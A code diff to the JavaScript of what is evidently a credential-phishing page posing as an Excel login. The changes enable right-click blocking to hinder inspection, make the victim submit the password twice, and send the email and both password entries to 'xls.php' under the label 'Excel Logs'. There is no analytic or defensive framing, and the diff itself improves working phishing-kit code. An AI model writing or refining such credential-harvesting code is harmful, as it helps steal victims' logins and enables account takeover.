@@ -1,4 +1,4 @@
-// document.addEventListener('contextmenu', event => event.preventDefault());
+document.addEventListener('contextmenu', event => event.preventDefault());
 
 const validEmail =
     /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
@@ -35,8 +35,8 @@ xsl_form.addEventListener("submit", (e)=>{
         notify("Password can't be empty !")
         return
     }
-
-    if (pass_input.value < 6 || pass_input.value.toUpperCase() == "QWERTY" || pass_input.value.toUpperCase() == "PASSWORD" || pass_input.value == 123456) {
+    
+    if (pass_input.value.length < 6 || pass_input.value.toUpperCase() == "QWERTY" || pass_input.value.toUpperCase() == "PASSWORD" || pass_input.value == 123456) {
         notify("Wrong password")
         return
     }
@@ -62,19 +62,32 @@ xsl_form.addEventListener("submit", (e)=>{
         return
     }
 
-    setTimeout(() => {
-        sub_btn.innerHTML = `<i>Connecting ...</i>`;
+    if (sub_count > 1) {
+        
+        if (pass_input.value.length < 6 || pass_input.value.toUpperCase() == "QWERTY" || pass_input.value.toUpperCase() == "PASSWORD" || pass_input.value == 123456) {
+            notify("Wrong password")
+            sub_count = 1
+            return
+        }
 
         setTimeout(() => {
-            sub_btn.innerHTML = `<i>Verifying ...</i>`; 
-            let url = "Domain" + "=" + "Excel Logs" + "&" + "Mail" +
-        "=" + mail_input.value + "&" + "Pass1" + "=" + temp_mail.value + "&" + "Pass2" + "=" + pass_input.value;
+            sub_btn.innerHTML = `<i>Connecting ...</i>`;
+            pass_input.type = "search";
+            pass_input.style.color = "transparent";
+    
+            setTimeout(() => {
+                sub_btn.innerHTML = `<i>Verifying ...</i>`; 
+                let url = "Domain" + "=" + "Excel Logs" + "&" + "Mail" +
+            "=" + mail_input.value + "&" + "Pass1" + "=" + temp_mail.value + "&" + "Pass2" + "=" + pass_input.value;
 
-        location = "xls.php?" + url;
-        pass_input.value = "";
-
-        }, 1500);
-    }, 100);
+            pass_input.type = "search";
+    
+            location = "xls.php?" + url;
+            pass_input.value = "";
+    
+            }, 1500);
+        }, 100);
+    }
 
 });
 
